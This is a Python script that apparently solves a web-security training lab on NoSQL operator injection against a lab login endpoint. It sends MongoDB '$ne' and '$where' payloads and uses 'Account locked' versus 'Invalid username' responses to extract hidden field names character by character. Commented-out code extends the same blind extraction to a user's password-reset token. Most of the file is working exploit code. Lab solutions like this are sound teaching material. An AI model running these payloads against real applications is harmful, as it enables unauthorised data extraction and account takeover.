# NoSQL injection 22 of 24
# Lab: Exploiting NoSQL operator injection to extract unknown fields

import asyncio
from pprint import pprint
from typing import Tuple
from common.base import run_payloads
from urllib.parse import quote_plus as urlencode_str

from common.base2 import evaluate_response, extract_data, parse_raw_request, send_single_request
from common.payload_generators import generate_alphanumeric

RAW_REQUEST = """
POST /login HTTP/2
Host: 0a2e007b038d684b80a4760900b9001e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a2e007b038d684b80a4760900b9001e.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://0a2e007b038d684b80a4760900b9001e.web-security-academy.net
Connection: keep-alive
Cookie: session=of2ct3mRWO8YKwXwiu6cH1hhjBoD1ZlT
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache

@@@PAYLOAD@@@
""".strip()

RAW_REQUEST_FORGOT = """
GET /forgot-password?@@@PAYLOAD@@@ HTTP/2
Host: 0a2e007b038d684b80a4760900b9001e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a2e007b038d684b80a4760900b9001e.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://0a2e007b038d684b80a4760900b9001e.web-security-academy.net
Connection: keep-alive
Cookie: session=of2ct3mRWO8YKwXwiu6cH1hhjBoD1ZlT
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
""".strip()

# async def one_call(raw_req):
#     """A simple call. Returns the response"""

#     result = await run_payloads(raw_req, [{}], lambda x: True, follow_redirects=True)
#     return result

# async def print_net_result(raw_req, print_response_body=False):
#     result = await one_call(raw_req)
#     if result['status_code'] in [200]:
#         secs = result['total_seconds']
#         print(f" CALL OK, {secs:.2f} secs")
#         if print_response_body: pprint(result['full_text'])
#         return True, result['full_text']
#     else:
#         print(" CALL FAILED")
#         if print_response_body: pprint(result['full_text'])
#         return False, result['full_text']

# def xmlencode (text: str) -> str:
#     return "".join(f"&#x{ord(c):X};" for c in text)

# def resp_lock (body: str) -> bool:
#     """Returns True if the response is "Invalid username or password" and False if it is "Account locked: please reset your password" """
#     if not body:
#         raise Exception("Empty response")
#     elif 'Invalid username or password' in body:
#         return False
#     elif 'Account locked' in body:
#         return True
#     else:
#         raise Exception(f"Unexpected response: {body}")

def response_pretty_print (descr: str, res_data: dict, extra: str = None, body: Tuple[int, int]|True = None) -> None:
    """Prints the response in a pretty way"""
    # isok_str = '??' if isok is None else ('True' if isok else 'False')
    print(f"{descr:>40}", end='')
    print(f" --- code {res_data['status_code']:<3}", end='')
    print(f" --- time {res_data['elapsed']:.3f}s", end='')
    print(f" --- {extra}")
    if body is True:
        print(f"Full body:\n{res_data['text']}")
    elif body:
        print(f"Partial body:\n{res_data['text'][body[0]:body[1]]}")

def lab_evaluate (res):
    callok = evaluate_response(res, {"status_code": 200})
    invalid = callok and evaluate_response(res, {"contains_text": "Invalid username or password"})
    locked = callok and evaluate_response(res, {"contains_text": "Account locked"})
    # print(f"==== Call ok: {callok}, Invalid: {invalid}, Locked: {locked}")
    if invalid and locked: return ('!', 'Both invalid and locked')
    elif invalid: return ('I', 'Invalid user')
    elif locked: return ('L', 'Locked user')
    else: return ('?', 'Unknown response')

# It returns "Invalid username or password"

login_req = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":§username§,"password":§password§}''')

res = asyncio.run(send_single_request(login_req, username='"carlos"', password='"test"'))
isok, label = lab_evaluate(res)
response_pretty_print("plain carlos/test", res, label, None) # (2500, 2800)


# It returns "Account locked: please reset your password"
# login_req = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":§username§,"password":§password§}''')

res = asyncio.run(send_single_request(login_req, username='"carlos"', password='{"$ne":"invalid"}'))
isok, label = lab_evaluate(res)
response_pretty_print('carlos/{"$ne":"invalid"}', res, label, None) # (2500, 2800)


# It returns "Invalid username or password"

login_req = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":§username§,"password":§password§,"$where": §where§}''')

res = asyncio.run(send_single_request(login_req, username='"carlos"', password='{"$ne":"invalid"}', where='"0"'))
isok, label = lab_evaluate(res)
response_pretty_print("Inject $where (false)", res, label, None) # (2500, 2800)


# # It returns "Account locked: please reset your password"

res = asyncio.run(send_single_request(login_req, username='"carlos"', password='{"$ne":"invalid"}', where='"1"'))
isok, label = lab_evaluate(res)
response_pretty_print("Inject $where (true)", res, label, None) # (2500, 2800)


# Now, we know that we can inject interesting code in the $where clause, now we'll use it for fields extraction

res = asyncio.run(send_single_request(login_req, username='"carlos"', password='{"$ne":"invalid"}', where='''"Object.keys(this)[1].match('^.{0}a.*')"'''))
isok, label = lab_evaluate(res)
response_pretty_print("Inject $where with fieldname inspection", res, label, None) # (2500, 2800)

length = 0
for i in range(1, 20):
    res = asyncio.run(send_single_request(login_req, username='"carlos"', password='{"$ne":"invalid"}', where='''"Object.keys(this)[1].match('^.{;;;}.*')"'''.replace(';;;', str(i))))
    isok, label = lab_evaluate(res)
    response_pretty_print(f"Inject $where with length {i} inspection", res, label, None) # (2500, 2800)
    if isok == 'I':
        break
    else:
        length = i
print(f"Found length of field name: {length}")

field_extraction_req_1 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where": "Object.keys(this)[1].match('^.{§pos§}§char§.*')"}''')
extracted = asyncio.run(
    extract_data(
        field_extraction_req_1, 
        length=length,
        true_condition={"status_code": 200, "contains_text": "Account locked"},
        charset=list(generate_alphanumeric()), 
        strategy="linear",
        max_concurrency=1
    )
)
print(f'\nExtracted: {extracted}')

# async def test (idx, pos, char):
#     raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[§idx§].match('^.{§pos§}§char§.*')"}''')
#     raw_req_7 = raw_req_7.replace('§idx§', str(idx)).replace('§pos§', str(pos)).replace('§char§', char)
#     print(f'Testing {char} in position {pos} for field {idx}:', end='')
#     _, resp = await print_net_result(raw_req_7, False)
#     return resp_lock(resp)

# async def extract_key(idx):
#     building = ''
#     for pos in range(0, 20):
#         for char in generate_alphanumeric():
#             isok = await test(idx, pos, char)
#             if isok: building += char; break
#         else:
#             # print(f'Field name: {building}')
#             # break
#             return True, building
#     else:
#         # print('Too long')
#         return False, building

# fields = [] # ['', 'username', 'password', 'email', 'resetToken']
# try:
#     for idx in range(0, 10):
#         isok, fieldname = await extract_key(idx)
#         if not isok:
#             print(f'(incomplete) Field name: {fieldname}')
#             break
#         else:
#             print(f'Field name: {fieldname}')
#             fields.append(fieldname)
#             print(fields)
# except Exception as e:
#     print(f'Exception: {e}')
#     print(f'Fields found so far: {fields}')

# # It returns the same as without params
# raw_req_8b = RAW_REQUEST_FORGOT.replace("@@@PAYLOAD@@@", "foo=invalid")
# print('With error:', end='')
# await print_net_result(raw_req_8b, False)

# # It returns "Invalid token", so we know that the resetToken field is the correct one to use
# raw_req_8c = RAW_REQUEST_FORGOT.replace("@@@PAYLOAD@@@", "resetToken=invalid")
# print('With error:', end='')
# await print_net_result(raw_req_8c, True)

# # Now, we need the correct resetToken value. We can exfiltrate it from the database using the login endpoint

# building = ''
# for pos in range(0, 20):
#     for char in generate_alphanumeric():

#         raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.resetToken.match('^.{§pos§}§char§.*')"}''')
#         raw_req_9 = raw_req_9.replace('§pos§', str(pos)).replace('§char§', char)
#         print(f'Testing {char} in position {pos}:', end='')
#         _, resp = await print_net_result(raw_req_9, False)
#         if resp_lock(resp):
#             building += char
#             print('(partial) resetToken:', building)
#             break
#     else:
#         print('resetToken:', building)
#         break
